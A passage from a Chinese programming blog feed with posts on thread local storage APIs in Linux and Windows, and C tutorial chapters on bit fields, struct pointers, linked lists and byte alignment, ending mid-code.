        <content type="html"><![CDATA[<h1 id="概念">概念</h1><p>线程局部存储(Thread Local Storage,即TLS)用于将数据与一个正在执行的指定线程关联起来,以实现线程的私有数据存储.</p><p><code>进程</code>中的全局变量和函数中的静态变量是各个<code>线程</code>都可以访问的共享变量,在一个线程进行修改,会影响到其他线程.虽然这样很方便数据的交换,但是不够安全,并且带来了很大的同步开销,也容易出bug.</p><p><code>TLS机制</code>就是用来实现在一个线程内部可访问,其他线程无法访问的变量,即<code>static memory local to a thread,线程局部静态变量</code>,或<code>Thread-Specific Data,TSD,线程特有数据</code> .</p><p>该机制在不同操作系统下的实现方式各不相同,对应的系统API也不相同,大多数操作系统都已实现.</p><h1 id="linux实现">linux实现</h1><p>API如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_key_create</span><span class="params">(<span class="type">pthread_key_t</span>* key, <span class="type">void</span> (*destructor)(<span class="type">void</span>*))</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_key_delete</span><span class="params">(<span class="type">pthread_key_t</span> key)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_setspecific</span><span class="params">(<span class="type">pthread_key_t</span> key, <span class="type">const</span> <span class="type">void</span>* value)</span>;</span><br><span class="line"><span class="type">void</span>* <span class="title function_">pthread_getspecific</span><span class="params">(<span class="type">pthread_key_t</span> key)</span>;</span><br></pre></td></tr></table></figure><p>其中:</p><ul><li>pthread_key_create : 为线程局部存储创建一个新的key,该key为全局所有线程可见的,线程退出时会调用destructor释放分配的缓存.</li><li>pthread_key_delete : 删除一个键,删除后,该key占用的内存被释放,注销一个TSD(并不会检查是否有线程正在使用)</li><li>pthread_setspecific : 设置对应key的具体的数据</li><li>pthread_getspecific : 获取对应key的具体的数据</li></ul><p>pthread_setspecific将一个变量的地址传入,与key关联;pthread_getspecific则获取到该地址,用于操作数据.</p><p>不同的线程中操作同一个key,不会冲突,不同线程使用同一个key得到的地址是各自之前set的值,互不影响.</p><p>如此,可以写一份线程代码,使用同一个key来多线程操作不同的数据.</p><p>使用pthread_setspecific为一个键指定新的数据时,线程必须释放原来的线程数据以回收空间.</p><p>由于删除一个键时,与该键关联的线程数据并不被释放,因此线程数据必须在释放键之前完成.</p><h1 id="windows实现">windows实现</h1><p>windows将TLS进行分块,分块数为<code>TLS_MINIMUM_AVAILABLE</code>,该值默认为64:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// winnt.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TLS_MINIMUM_AVAILABLE 64</span></span><br></pre></td></tr></table></figure><p>API如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DWORD <span class="title function_">TlsAlloc</span><span class="params">()</span>;</span><br><span class="line">BOOL <span class="title function_">TlsSetValue</span><span class="params">(DWORD dwTlsIndex, LPVOID lpTlsValue)</span>;</span><br><span class="line">LPVOID <span class="title function_">TlsGetValue</span><span class="params">(DWORD dwTlsIndex)</span></span><br><span class="line">BOOL <span class="title function_">TlsFree</span><span class="params">(DWORD dwTlsIndex)</span></span><br></pre></td></tr></table></figure><p>其中:</p><ul><li>TlsAlloc : 获得一个索引,如果调用成功,则得到一个索引值,否则返回<code>TLS_OUT_OFF_INDEXES(0xffffffff)</code></li><li>TlsSetValue : 通过索引设置数据</li><li>TlsGetValue : 通过索引获取数据</li><li>TlsFree : 释放索引和内存块</li></ul><h1 id="tls回调函数">TLS回调函数</h1>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
            <tag> 反调试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-14_3-使用位域进行位操作</title>
      <link href="/202423c9a8f7f871/"/>
      <url>/202423c9a8f7f871/</url>
      
        <content type="html"><![CDATA[<h1 id="引入问题">引入问题</h1><p>假设我们需要管理一些文件,其中除了文件的其他信息,我们还需要管理文件的权限,共有以下3种权限:</p><ul><li>是否可读—r</li><li>是否可写—w</li><li>是否可执行—x</li></ul><p>每个文件的以上3种权限都不同,现在我们需要设置一个结构体来管理文件.</p><p>一种方法是使用3个<code>unsigned int</code>类型的变量作为标志来存储这些权限信息:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_t</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> * file_name;</span><br><span class="line">    <span class="type">size_t</span> file_size;</span><br><span class="line">    ... <span class="comment">// 其他文件信息</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> r,w,x; <span class="comment">// 分别记录3种权限</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然是可以的,但是一个<code>unsigned int</code>类型的成员就占用4字节空间(64位平台),3个成员就占用了12个字节,而实际上我们需要的仅仅是3个bit的标志位!</p><p>位段可以一定程度上节省空间,另一方面可以简化对位标志的操作.</p><p>C语言提供了<code>位域(或译位段)</code>来允许我们按位来定义成员并操作.</p><h1 id="位域的声明和使用">位域的声明和使用</h1><p><code>位域</code>是一种特殊的结构体,该结构体的成员是<code>signed int</code>或<code>unsigned int</code>类型变量中的一组位(bit),我们仍然使用<code>struct</code>关键字来定义一个位域,并指定每一个成员所占用的位数.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">permission</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> r : <span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> w : <span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> x : <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上述结构体位域有3个位域成员,分别为r,w,x,他们根据定义分别在结构体中占用1bit的空间,共占用3bit空间.</p><p>我们可以像访问结构体成员那样来访问各个位段成员,但是需要注意赋的值不能超过位段成员的存储范围,例如3bit(unsigned)的位段成员范围为[0,2^3-1].</p><p>例如如下代码说明文件file1的属性为只读,即仅可以读取,不能写入和执行:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">permission</span> <span class="title">file1</span>;</span></span><br><span class="line">file1.r = <span class="number">1</span>; <span class="comment">// 允许读取</span></span><br><span class="line">file1.w = <span class="number">0</span>; <span class="comment">// 不允许写入</span></span><br><span class="line">file1.x = <span class="number">0</span>; <span class="comment">// 不允许执行</span></span><br></pre></td></tr></table></figure><h1 id="位域的兼容性与占用空间">位域的兼容性与占用空间</h1><h2 id="兼容性与实现问题">兼容性与实现问题</h2><p>位段有许多兼容性和实现问题:</p><ol><li>位段成员如果未显式使用<code>signed int</code>或<code>unsigned int</code>声明,则它究竟被解释为有符号还是无符号数是由编译器决定的.</li><li><code>int</code>被解释为有符号还是无符号也是实现问题.</li><li>位段成员的最大位长度,许多编译器将其限制在整型值的长度内.(注意32位和16位的整型值长度就不一样)</li><li>位段的成员在内存中的分布情况也是未定义的,取决于具体的实现.</li><li>当一个位段成员较大,无法放在前面所剩余的位中,编译器可能将其放在下一个内存位置对齐,也可能紧挨在前一个位段成员后面,造成重叠.</li><li>是否允许除<code>int</code>,<code>unsigned int</code>外类型的位域是未定义的.</li></ol><p>第5点即:位域是否能越过分配单元边界,这是未定义的.</p><h2 id="占用空间">占用空间</h2><p>位域整体是向整型类型对齐的. <strong>PS:可能有误</strong></p><p>但是由于位域成员的各种基于实现的行为,无法说明位域成员的准确表现.不过我们有2种显式的填充和对齐方法:</p><p>使用未命名的字段来填充未命名的空间;使用未命名的0宽度的字段来迫使下一个字段向下一个整数对齐:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">s</span>&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> f1 : <span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>    : <span class="number">2</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> f2 : <span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>    : <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> f3 : <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中f1和f2之间有2bit的空位,f3将存储在(即对齐)下一个<code>unsigned int</code>的位置处(注意其在这一段内存中的位置仍旧是未定义的).</p><h1 id="优缺点">优缺点</h1><p>位域的各种用途完全可以使用对应的位操作来替代,但是使用位域显然大大简化了操作—我们将他们视为结构体的成员.</p><p>尽管如此,位域在底层仍然无法避免对应的位偏移等操作,它只是对我们屏蔽了而已.</p><p>另一方面,位域有着一系列未定义的行为,亦即由实现决定,需要考虑其兼容性问题.</p><p>同时,如果需要的标志位的总长度很少,例如上面例子的3bit(r/w/x),可能并不能起到节省空间的作用—例如可以将这3bit的标志位压缩于一个<code>unsigned char</code>变量中.</p><p>总之,在使用位域之前,一定要把位域简化代码的优点和其移植性弱的缺点相权衡!</p><br><p>本章简单讲解了<code>位域</code>,除了一些底层的代码,一般使用并不多,了解即可.</p><p align=right>——WAHAHA 2024.2.24 于火车上完成</p><p align=right>开学了QWQ</p><br><br><p>上一篇:<a href="../2024aaafa05fda1d">C语言教程-14_2-结构体与指针</a></p><p>下一篇:<a href="../2024f9a5468d726b">C语言教程-14_4-共用体</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-14_2-结构体与指针和字节对齐</title>
      <link href="/2024fb920269a49f/"/>
      <url>/2024fb920269a49f/</url>
      
        <content type="html"><![CDATA[<h1 id="结构体指针">结构体指针</h1><p>前面说过多次,指针可以指向各种类型的可寻址对象,结构体也在其列,并且结构体指针有着重要意义.</p><p>由于结构体往往比较庞大,许多处理结构体的函数如果都直接传递结构体变量作为实参,那么参数值的复制会极大低降低运行效率,更别提如果返回值是一个修改后的结构体了.</p><p>我们仍然可以仅传递一个结构体变量的指针,让被调函数直接修改或访问主调函数内的结构体变量.</p><h2 id="声明结构体指针">声明结构体指针</h2><p>这样声明并初始化一个结构体指针:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 为了各个函数都能使用该结构体,将其定义在全局作用域</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TEST</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 这样声明一个结构体指针并初始化:</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TEST</span> <span class="title">t</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TEST</span> *<span class="title">p</span> =</span> &amp;t;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="使用结构体指针访问结构体">使用结构体指针访问结构体</h2><p>接下来,要使用该指针<code>p</code>来访问结构体,我们有2种方法:</p><ol><li><p>使用<code>(*p).a</code>,<code>(*p).arr</code>这样的形式来访问指向的结构体的成员.</p><p>由于<code>运算符.</code>的优先级高于<code>运算符*</code>,所以需要加<code>括号()</code>改变运算顺序.</p></li><li><p>使用<code>指向结构体成员运算符-&gt;</code>来直接访问指针指向的结构体的成员.</p><p>即<code>p-&gt;a</code>,<code>p-&gt;arr</code>这样的形式,它们和方法1完全相同,但是显然更加方便直观.</p></li></ol><p>下面的例子写两个函数,用于给结构体赋值和打印结构体的值:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 为了各个函数都能使用该结构体,将其定义在全局作用域</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TEST</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">(<span class="keyword">struct</span> TEST *p)</span> &#123;</span><br><span class="line">    p-&gt;a = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        p-&gt;arr[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(<span class="keyword">struct</span> TEST *p)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a = %d\n&quot;</span>, p-&gt;a);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;arr[%d] = %d\n&quot;</span>, i, p-&gt;arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 这样声明一个结构体指针并初始化:</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TEST</span> <span class="title">t</span>, *<span class="title">p</span> =</span> &amp;t; <span class="comment">// 可以写在同一行,但是指针要在结构体变量之后声明</span></span><br><span class="line">    init(p); <span class="comment">// 传入结构体指针,初始化结构体</span></span><br><span class="line">    print(p); <span class="comment">// 打印结构体的成员</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然,上面的例子是为了讲解结构体指针变量,这个程序其实在调用函数时直接使用<code>init(&amp;t)</code>和<code>print(&amp;t)</code>即可.</p><h1 id="初步实现引例">初步实现引例</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 书籍结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Book</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">100</span>]; <span class="comment">// 书名</span></span><br><span class="line">    <span class="type">char</span> author[<span class="number">100</span>]; <span class="comment">// 作者</span></span><br><span class="line">    <span class="type">int</span> year; <span class="comment">// 出版年份</span></span><br><span class="line">    <span class="type">int</span> page; <span class="comment">// 页数</span></span><br><span class="line">    <span class="type">int</span> stock; <span class="comment">// 库存</span></span><br><span class="line">    <span class="type">float</span> price; <span class="comment">// 价格</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 书店的信息</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_BOOKS 1000</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BookStore</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">100</span>]; <span class="comment">// 书店名</span></span><br><span class="line">    <span class="type">char</span> address[<span class="number">100</span>]; <span class="comment">// 地址</span></span><br><span class="line">    <span class="type">int</span> phone; <span class="comment">// 电话</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Book</span> <span class="title">books</span>[<span class="title">MAX_BOOKS</span>];</span> <span class="comment">// 最多1000种书目</span></span><br><span class="line">    <span class="type">int</span> bookCount; <span class="comment">// 书籍数量</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_bookstore</span><span class="params">(<span class="keyword">struct</span> BookStore *store)</span> &#123;</span><br><span class="line">    <span class="comment">// 实际上,这里都可以改成scanf()来输入数据,请读者自行尝试</span></span><br><span class="line">    <span class="built_in">strcpy</span>(store-&gt;name, <span class="string">&quot;xxx书店&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(store-&gt;address, <span class="string">&quot;xx市xx区xxx街xxx号&quot;</span>);</span><br><span class="line">    store-&gt;phone = <span class="number">88888888</span>;</span><br><span class="line">    store-&gt;bookCount = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add_book</span><span class="params">(<span class="keyword">struct</span> BookStore *store, <span class="keyword">struct</span> Book *book)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (store-&gt;bookCount &lt; MAX_BOOKS) &#123;</span><br><span class="line">        store-&gt;books[store-&gt;bookCount] = *book;</span><br><span class="line">        store-&gt;bookCount++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BookStore</span> <span class="title">store</span>;</span></span><br><span class="line">    init_bookstore(&amp;store);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;书店名: %s\n&quot;</span>, store.name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;地址: %s\n&quot;</span>, store.address);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;电话: %d\n&quot;</span>, store.phone);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Book</span> <span class="title">book1</span> =</span> &#123;<span class="string">&quot;C语言教程&quot;</span>, <span class="string">&quot;WAHAHA&quot;</span>, <span class="number">2023</span>, <span class="number">500</span>, <span class="number">100</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Book</span> <span class="title">book2</span> =</span> &#123;<span class="string">&quot;1+1的正确性证明&quot;</span>,<span class="string">&quot;佚名&quot;</span>, <span class="number">2023</span>, <span class="number">500</span>, <span class="number">100</span>, <span class="number">100</span>&#125;;</span><br><span class="line">    add_book(&amp;store, &amp;book1);</span><br><span class="line">    add_book(&amp;store, &amp;book2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;书籍数量: %d\n&quot;</span>, store.bookCount);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;书籍1: %s, 作者: %s, 出版年份: %d, 页数: %d, 库存: %d, 价格: %.2f\n&quot;</span>, store.books[<span class="number">0</span>].name, store.books[<span class="number">0</span>].author, store.books[<span class="number">0</span>].year, store.books[<span class="number">0</span>].page, store.books[<span class="number">0</span>].stock, store.books[<span class="number">0</span>].price);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;书籍2: %s, 作者: %s, 出版年份: %d, 页数: %d, 库存: %d, 价格: %.2f\n&quot;</span>, store.books[<span class="number">1</span>].name, store.books[<span class="number">1</span>].author, store.books[<span class="number">1</span>].year, store.books[<span class="number">1</span>].page, store.books[<span class="number">1</span>].stock, store.books[<span class="number">1</span>].price);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240209105727399.png" alt="image-20240209105727399" style="zoom:50%;" /><p>代码中使用了<code>-&gt;</code>这个运算符,它是用于结构体指针的.</p><p>例如有<code>struct BookStore *store</code>,那么<code>store-&gt;bookCount</code>等价于<code>(*store).bookCount</code></p><h1 id="指向自身类型的结构体指针成员">指向自身类型的结构体指针成员</h1><p>本节十分重要!!!关乎到后续<code>数据结构</code>的学习(C语言实现)!!!</p><p>前面说过,一个结构体内部不能拥有自身类型的成员,否则会无限递归下去,导致编译错误.</p><p>不过,一个结构体内部可以拥有指向自身类型的指针成员!原因很简单:一个指针变量的大小是确定的,无论指向的类型是什么,同一个环境下(例如现在全面普及的x86_64计算机)的大小都是固定的.</p><p>PS:复习一下,64位系统下的指针类型占用8字节,32位系统下的指针类型占用4字节,至于16位…呵呵,2字节.</p><p>既然指针的大小是固定的,那么这个结构体的大小自然可以确定,因此这个指针是可以正确确定的,自然整个结构体就可以确定.</p><p>我们可以试试查看一个结构体类型的大小:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">        <span class="type">int</span> data1,data2;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">next</span>;</span>  </span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sizeof(struct Node) = %d\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240209222539301.png" alt="image-20240209222539301" style="zoom:50%;" /><p>这里的大小:16字节=2个int变量(8字节)+1个指针(64位系统,8字节)</p><p>需要注意的是,这里故意使用了2个int变量,刚好<code>字节对齐</code>,关于<code>字节对齐</code>需要另外讲解.</p><p>看一个简单的例子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 一个结构体内部可以拥有指向自身类型的指针成员</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">        <span class="type">int</span> data;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">next</span>;</span> <span class="comment">// 指向自身类型的指针成员</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// 声明3个结构体变量</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> <span class="title">n1</span>, <span class="title">n2</span>, <span class="title">n3</span>;</span></span><br><span class="line">    <span class="comment">// 为data赋值</span></span><br><span class="line">    n1.data = <span class="number">1</span>;</span><br><span class="line">    n2.data = <span class="number">2</span>;</span><br><span class="line">    n3.data = <span class="number">3</span>;</span><br><span class="line">    <span class="comment">// 为next指针赋值</span></span><br><span class="line">    n1.next = &amp;n2;</span><br><span class="line">    n2.next = &amp;n3;</span><br><span class="line">    n3.next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// 打印链表</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">p</span> =</span> &amp;n1;</span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d-&gt;&quot;</span>, p-&gt;data);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;NULL\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240209222045099.png" alt="image-20240209222045099" style="zoom:50%;" /><p>可以看到,结构体中的next成员是指向自身类型的指针,这个例子中我们利用这个成员将各个变量&quot;串联&quot;在一起,实际上这就形成了一个非常简单的<code>链表</code>.</p><p>当然,这些结构体变量的next成员也完全可以被赋值为指向自己,不过显然并没有什么实际用途.</p><p>后续我们会大量地使用到这种写法!(除非你不学数据结构)</p><h1 id="字节对齐">字节对齐</h1><p>Cppreference中对于<code>对齐</code>的描述如下:</p><p><code>每个完整对象类型拥有一个称作对齐要求的属性，它是一个 size_t 类型的整数值，表示此类型对象可以分配的相继地址之间的字节数。合法的对齐值是二的非负数次幂。</code></p><p>结构体有着不同类型的成员,他们彼此之间的大小不尽相同,为了保持字节对齐,个别成员之间可能并不是紧密相邻,而是相隔着一些填充位.</p><p>有如下规则:</p><ol><li>结构体的大小是有效对齐值的整数倍,如有需要会在最后一个成员后面填充若干字节.</li><li>结构体的每个成员相对结构体首地址的偏移量是有效对齐值的整数倍.</li></ol><p>由于关于<code>对齐</code>的内容太过复杂,本教程主要面向初学者,<s>并且本人能力有限</s>,因此主要举几个例子即可,相信各位能够理解.</p><br><p>一般情况下,对齐值都取结构体内最大成员所占的字节数,然后各个成员向该值对齐.</p><p>结构体中各个成员按照声明顺序排列,按规则进行适当的填充对齐.</p><p>几个例子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 